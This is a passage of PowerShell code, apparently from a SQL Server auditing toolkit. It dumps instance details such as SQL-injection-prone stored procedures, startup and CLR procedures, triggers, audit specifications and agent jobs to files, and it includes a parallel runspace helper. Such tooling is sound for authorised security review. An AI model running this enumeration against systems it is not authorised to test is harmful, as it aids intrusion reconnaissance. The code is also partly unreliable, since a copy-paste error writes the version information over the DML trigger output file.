            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_policy.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting potential SQLi Stored Procedures
        Write-Verbose -Message "$Instance - Getting stored procedures with potential SQL Injection..."
        $Results = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_stored_procedure_sqli.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_stored_procedure_sqli.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting startup Stored Procedures
        Write-Verbose -Message "$Instance - Getting startup stored procedures..."
        $Results = Get-SQLStoredProcedureAutoExec -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_stored_procedure_startup.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_stored_procedure_startup.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting CLR Stored Procedures
        Write-Verbose -Message "$Instance - Getting CLR stored procedures..."
        $Results = Get-SQLStoredProcedureCLR -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_stored_procedur_CLR.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_CLR_stored_procedure_CLR.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Triggers DML
        Write-Verbose -Message "$Instance - Getting DML triggers..."
        $Results = Get-SQLTriggerDml -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Triggers DDL
        Write-Verbose -Message "$Instance - Getting DDL triggers..."
        $Results = Get-SQLTriggerDdl -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_ddl.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_ddl.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Version Information
        Write-Verbose -Message "$Instance - Getting server version information..."
        $Results = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_triggers_dml.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Audit Database Specification Information
        Write-Verbose -Message "$Instance - Getting Database audit specification information..."
        $Results = Get-SQLDBSpec -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Audit_Database_Specifications.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Audit_Database_Specifications.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Audit Server Specification Information
        Write-Verbose -Message "$Instance - Getting Server audit specification information..."
        $Results = Get-SQLAuditServerSpec -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Audit__Server_Specifications.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Audit_Server_Specifications.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Agent Jobs Information
        Write-Verbose -Message "$Instance - Getting Agent Jobs information..."
        $Results = Get-SQLAgentJob -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Agent_Job.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Agent_Jobs.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting OLE DB provder information
        Write-Verbose -Message "$Instance - Getting OLE DB provder information..."
        $Results = Get-SQLOleDbProvder -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_OleDbProvders.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_OleDbProvders.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        Write-Verbose -Message "$Instance - END"
    }
    End
    {
    }
}

function Invoke-Parallel
{
   
       
    [cmdletbinding(DefaultParameterSetName = 'ScriptBlock')]
    Param (
        [Parameter(Mandatory = $false,position = 0,ParameterSetName = 'ScriptBlock')]
        [System.Management.Automation.ScriptBlock]$ScriptBlock,

        [Parameter(Mandatory = $false,ParameterSetName = 'ScriptFile')]
        [ValidateScript({
                    Test-Path $_ -PathType leaf
        })]
        $ScriptFile,

        [Parameter(Mandatory = $true,ValueFromPipeline = $true)]
        [Alias('CN','__Server','IPAddress','Server','ComputerName')]
        [PSObject]$InputObject,

        [PSObject]$Parameter,

        [switch]$ImportSessionFunctions,

        [switch]$ImportVariables,

        [switch]$ImportModules,

        [int]$Throttle = 20,

        [int]$SleepTimer = 200,

        [int]$RunspaceTimeout = 0,

        [switch]$NoCloseOnTimeout = $false,

        [int]$MaxQueue,

        [validatescript({
                    Test-Path (Split-Path -Path $_ -Parent)
        })]
        [string]$LogFile = 'C:\temp\log.log',

        [switch] $Quiet = $false
    )

    Begin {

        #No max queue specified?  Estimate one.
        #We use the script scope to resolve an odd PowerShell 2 issue where MaxQueue isn't seen later in the function
        if( -not $PSBoundParameters.ContainsKey('MaxQueue') )
        {
            if($RunspaceTimeout -ne 0)
            {
                $script:MaxQueue = $Throttle
            }
            else
            {
                $script:MaxQueue = $Throttle * 3
            }
        }
        else
        {
            $script:MaxQueue = $MaxQueue
        }

        #Write-Verbose "Throttle: '$throttle' SleepTimer '$sleepTimer' runSpaceTimeout '$runspaceTimeout' maxQueue '$maxQueue' logFile '$logFile'"

        #If they want to import variables or modules, create a clean runspace, get loaded items, use those to exclude items
        if ($ImportVariables -or $ImportModules)
        {
            $StandardUserEnv = [powershell]::Create().addscript({
                    #Get modules and snapins in this clean runspace
                    $Modules = Get-Module | Select-Object -ExpandProperty Name
                    $Snapins = Get-PSSnapin | Select-Object -ExpandProperty Name

                    #Get variables in this clean runspace
                    #Called last to get vars like $? into session
                    $Variables = Get-Variable | Select-Object -ExpandProperty Name

                    #Return a hashtable where we can access each.
                    @{
                        Variables = $Variables
                        Modules   = $Modules
                        Snapins   = $Snapins
                    }
            }).invoke()[0]

            if ($ImportVariables)
            {
                #Exclude common parameters, bound parameters, and automatic variables
                Function _temp
                {
                    [cmdletbinding()] param()
                }
                $VariablesToExclude = @( (Get-Command _temp | Select-Object -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )
                #Write-Verbose "Excluding variables $( ($VariablesToExclude | sort ) -join ", ")"

                # we don't use 'Get-Variable -Exclude', because it uses regexps.
                # One of the veriables that we pass is '$?'.
                # There could be other variables with such problems.
                # Scope 2 required if we move to a real module
                $UserVariables = @( Get-Variable | Where-Object -FilterScript {
                        -not ($VariablesToExclude -contains $_.Name)
                } )
                #Write-Verbose "Found variables to import: $( ($UserVariables | Select -expandproperty Name | Sort ) -join ", " | Out-String).`n"
            }

            if ($ImportModules)
            {
                $UserModules = @( Get-Module |
                    Where-Object -FilterScript {
                        $StandardUserEnv.Modules -notcontains $_.Name -and (Test-Path -Path $_.Path -ErrorAction SilentlyContinue)
                    } |
                Select-Object -ExpandProperty Path )
                $UserSnapins = @( Get-PSSnapin |
                    Select-Object -ExpandProperty Name |
                    Where-Object -FilterScript {
                        $StandardUserEnv.Snapins -notcontains $_
                } )
            }
        }

        #region functions

        Function Get-RunspaceData
        {
            [cmdletbinding()]
            param( [switch]$Wait )

            #loop through runspaces
            #if $wait is specified, keep looping until all complete
            Do
            {
                #set more to false for tracking completion
                $more = $false

                #Progress bar if we have inputobject count (bound parameter)
                if (-not $Quiet)
                {
                    Write-Progress  -Activity 'Running Query' -Status 'Starting threads'`
                    -CurrentOperation "$startedCount threads defined - $totalCount input objects - $script:completedCount input objects processed"`
                    -PercentComplete $( Try
                        {
                            $script:completedCount / $totalCount * 100
                        }
                        Catch
                        {
                            0
                        }
                    )
                }

                #run through each runspace.
                Foreach($runspace in $runspaces)
                {
                    #get the duration - inaccurate
                    $currentdate = Get-Date
                    $runtime = $currentdate - $runspace.startTime
                    $runMin = [math]::Round( $runtime.totalminutes ,2 )

                    #set up log object
                    $log = '' | Select-Object -Property Date, Action, Runtime, Status, Details
                    $log.Action = "Removing:'$($runspace.object)'"
                    $log.Date = $currentdate
                    $log.Runtime = "$runMin minutes"

                    #If runspace completed, end invoke, dispose, recycle, counter++
                    If ($runspace.Runspace.isCompleted)
                    {
                        $script:completedCount++

                        #check if there were errors
                        if($runspace.powershell.Streams.Error.Count -gt 0)
                        {
                            #set the logging info and move the file to completed
                            $log.status = 'CompletedWithErrors'
                            #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            foreach($ErrorRecord in $runspace.powershell.Streams.Error)
                            {
                                Write-Error -ErrorRecord $ErrorRecord
                            }
                        }
                        else
                        {
                            #add logging details and cleanup
                            $log.status = 'Completed'
                            #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                        }

                        #everything is logged, clean up the runspace
                        $runspace.powershell.EndInvoke($runspace.Runspace)
                        $runspace.powershell.dispose()
                        $runspace.Runspace = $null
                        $runspace.powershell = $null
                    }

                    #If runtime exceeds max, dispose the runspace
                    ElseIf ( $RunspaceTimeout -ne 0 -and $runtime.totalseconds -gt $RunspaceTimeout)
                    {
                        $script:completedCount++
                        $timedOutTasks = $true

                        #add logging details and cleanup
                        $log.status = 'TimedOut'
                        #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                        Write-Error -Message "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | Out-String)"

                        #Depending on how it hangs, we could still get stuck here as dispose calls a synchronous method on the powershell instance
                        if (!$NoCloseOnTimeout)
                        {
                            $runspace.powershell.dispose()
                        }
                        $runspace.Runspace = $null
                        $runspace.powershell = $null
                        $completedCount++
                    }

                    #If runspace isn't null set more to true
                    ElseIf ($runspace.Runspace -ne $null )
                    {
                        $log = $null
                        $more = $true
                    }

                    #log the results if a log file was indicated
                    <#
                            if($logFile -and $log){
                            ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1] | out-file $LogFile -append
                            }
                    #>
                }

                #Clean out unused runspace jobs
                $temphash = $runspaces.clone()
                $temphash |
                Where-Object -FilterScript {
                    $_.runspace -eq $null
                } |
                ForEach-Object -Process {
                    $runspaces.remove($_)
                }

                #sleep for a bit if we will loop again
                if($PSBoundParameters['Wait'])
                {
                    Start-Sleep -Milliseconds $SleepTimer
                }

                #Loop again only if -wait parameter and there are more runspaces to process
            }
            while ($more -and $PSBoundParameters['Wait'])

            #End of runspace function
        }

        #endregion functions

        #region Init

        if($PSCmdlet.ParameterSetName -eq 'ScriptFile')
        {
            $ScriptBlock = [scriptblock]::Create( $(Get-Content $ScriptFile | Out-String) )
        }
        elseif($PSCmdlet.ParameterSetName -eq 'ScriptBlock')
        {
            #Start building parameter names for the param block
            [string[]]$ParamsToAdd = '$_'
            if( $PSBoundParameters.ContainsKey('Parameter') )
            {
                $ParamsToAdd += '$Parameter'
            }

            $UsingVariableData = $null


            # This code enables $Using support through the AST.
            # This is entirely from  Boe Prox, and his https://github.com/proxb/PoshRSJob module; all credit to Boe!

            if($PSVersionTable.PSVersion.Major -gt 2)
            {
                #Extract using references
                $UsingVariables = $ScriptBlock.ast.FindAll({
                        $args[0] -is [System.Management.Automation.Language.UsingExpressionAst]
                },$true)

                If ($UsingVariables)
                {
                    $List = New-Object -TypeName 'System.Collections.Generic.List`1[System.Management.Automation.Language.VariableExpressionAst]'
                    ForEach ($Ast in $UsingVariables)
                    {
                        [void]$List.Add($Ast.SubExpression)
                    }

                    $UsingVar = $UsingVariables |
                    Group-Object -Property SubExpression |
                    ForEach-Object -Process {
                        $_.Group |
                        Select-Object -First 1
                    }

                    #Extract the name, value, and create replacements for each
                    $UsingVariableData = ForEach ($Var in $UsingVar)
                    {
                        Try
                        {
                            $Value = Get-Variable -Name $Var.SubExpression.VariablePath.UserPath -ErrorAction Stop
                            [pscustomobject]@{
                                Name       = $Var.SubExpression.Extent.Text
                                Value      = $Value.Value
                                NewName    = ('$__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                NewVarName = ('__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                            }
                        }
                        Catch
                        {
                            Write-Error -Message "$($Var.SubExpression.Extent.Text) is not a valid Using: variable!"
                        }
                    }
                    $ParamsToAdd += $UsingVariableData | Select-Object -ExpandProperty NewName -Unique

                    $NewParams = $UsingVariableData.NewName -join ', '
                    $Tuple = [Tuple]::Create($List, $NewParams)
                    $bindingFlags = [Reflection.BindingFlags]'Default,NonPublic,Instance'
                    $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$bindingFlags))

                    $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))

                    $ScriptBlock = [scriptblock]::Create($StringScriptBlock)

                    #Write-Verbose $StringScriptBlock
                }
            }

            $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ', '))`r`n" + $ScriptBlock.ToString())
        }
        else
        {
            Throw 'Must provide ScriptBlock or ScriptFile'
            Break
        }

        Write-Debug -Message "`$ScriptBlock: $($ScriptBlock | Out-String)"
        If (-not($SuppressVerbose)){
            Write-Verbose -Message 'Creating runspace pool and session states'
        }


        #If specified, add variables and modules/snapins to session state
        $sessionstate = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        if ($ImportVariables)
        {
            if($UserVariables.count -gt 0)
            {
                foreach($Variable in $UserVariables)
                {
                    $sessionstate.Variables.Add( (New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Variable.Name, $Variable.Value, $null) )
                }
            }
        }
        if ($ImportModules)
        {
            if($UserModules.count -gt 0)
            {
                foreach($ModulePath in $UserModules)
                {
                    $sessionstate.ImportPSModule($ModulePath)
                }
            }
            if($UserSnapins.count -gt 0)
            {
                foreach($PSSnapin in $UserSnapins)
                {
                    [void]$sessionstate.ImportPSSnapIn($PSSnapin, [ref]$null)
                }
            }
        }

        # --------------------------------------------------
        #region - Import Session Functions
        # --------------------------------------------------
        # Import functions from the current session into the RunspacePool sessionstate

        if($ImportSessionFunctions)
        {
            # Import all session functions into the runspace session state from the current one
            Get-ChildItem -Path Function:\ |
            Where-Object -FilterScript {
                $_.name -notlike '*:*'
            } |
            Select-Object -Property name -ExpandProperty name |
            ForEach-Object -Process {
                # Get the function code
                $Definition = Get-Content -Path "function:\$_" -ErrorAction Stop

                # Create a sessionstate function with the same name and code
                $SessionStateFunction = New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList "$_", $Definition

                # Add the function to the session state
                $sessionstate.Commands.Add($SessionStateFunction)
            }
        }
        #endregion

        #Create runspace pool
        $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
        $runspacepool.Open()

        #Write-Verbose "Creating empty collection to hold runspace jobs"
        $Script:runspaces = New-Object -TypeName System.Collections.ArrayList

        #If inputObject is bound get a total count and set bound to true
        $bound = $PSBoundParameters.keys -contains 'InputObject'
        if(-not $bound)
        {
            [System.Collections.ArrayList]$allObjects = @()
        }

        <#
                #Set up log file if specified
                if( $LogFile ){
                New-Item -ItemType file -path $logFile -force | Out-Null
                ("" | Select Date, Action, Runtime, Status, Details | ConvertTo-Csv -NoTypeInformation -Delimiter ";")[0] | Out-File $LogFile
                }

                #write initial log entry
                $log = "" | Select Date, Action, Runtime, Status, Details
                $log.Date = Get-Date
                $log.Action = "Batch processing started"
                $log.Runtime = $null
                $log.Status = "Started"
                $log.Details = $null
                if($logFile) {
                ($log | convertto-csv -Delimiter ";" -NoTypeInformation)[1] | Out-File $LogFile -Append
                }
        #>
        $timedOutTasks = $false

        #endregion INIT
    }

    Process {

        #add piped objects to all objects or set all objects to bound input object parameter
        if($bound)
        {
            $allObjects = $InputObject
        }
        Else
        {
            [void]$allObjects.add( $InputObject )
        }
    }

    End {

        #Use Try/Finally to catch Ctrl+C and clean up.
        Try
        {
            #counts for progress
            $totalCount = $allObjects.count
            $script:completedCount = 0
            $startedCount = 0

            foreach($object in $allObjects)
            {
                #region add scripts to runspace pool

                #Create the powershell instance, set verbose if needed, supply the scriptblock and parameters
                $powershell = [powershell]::Create()

                if ($VerbosePreference -eq 'Continue')
                {
                    [void]$powershell.AddScript({
                            $VerbosePreference = 'Continue'
                    })
                }

                [void]$powershell.AddScript($ScriptBlock).AddArgument($object)

                if ($Parameter)
                {
                    [void]$powershell.AddArgument($Parameter)
                }

                # $Using support from Boe Prox
                if ($UsingVariableData)
                {
                    Foreach($UsingVariable in $UsingVariableData)
                    {
                        #Write-Verbose "Adding $($UsingVariable.Name) with value: $($UsingVariable.Value)"
                        [void]$powershell.AddArgument($UsingVariable.Value)
                    }
                }

                #Add the runspace into the powershell instance
                $powershell.RunspacePool = $runspacepool

                #Create a temporary collection for each runspace
                $temp = '' | Select-Object -Property PowerShell, StartTime, object, Runspace
                $temp.PowerShell = $powershell
                $temp.StartTime = Get-Date
                $temp.object = $object

                #Save the handle output when calling BeginInvoke() that will be used later to end the runspace
                $temp.Runspace = $powershell.BeginInvoke()
                $startedCount++

                #Add the temp tracking info to $runspaces collection
                #Write-Verbose ( "Adding {0} to collection at {1}" -f $temp.object, $temp.starttime.tostring() )
                $null = $runspaces.Add($temp)

                #loop through existing runspaces one time
                Get-RunspaceData

                #If we have more running than max queue (used to control timeout accuracy)
                #Script scope resolves odd PowerShell 2 issue
                $firstRun = $true
                while ($runspaces.count -ge $script:MaxQueue)
                {
                    #give verbose output
                    if($firstRun)
                    {
                        #Write-Verbose "$($runspaces.count) items running - exceeded $Script:MaxQueue limit."
                    }
                    $firstRun = $false

                    #run get-runspace data and sleep for a short while
                    Get-RunspaceData
                    Start-Sleep -Milliseconds $SleepTimer
                }

                #endregion add scripts to runspace pool
            }

            #Write-Verbose ( "Finish processing the remaining runspace jobs: {0}" -f ( @($runspaces | Where {$_.Runspace -ne $Null}).Count) )
            Get-RunspaceData -wait

            if (-not $Quiet)
            {
                Write-Progress -Activity 'Running Query' -Status 'Starting threads' -Completed
            }
        }
        Finally
        {
            #Close the runspace pool, unless we specified no close on timeout and something timed out
            if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($NoCloseOnTimeout -eq $false) ) )
            {
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message 'Closing the runspace pool'
                }
                $runspacepool.close()
            }

            #collect garbage
            [gc]::Collect()
        }
    }
}


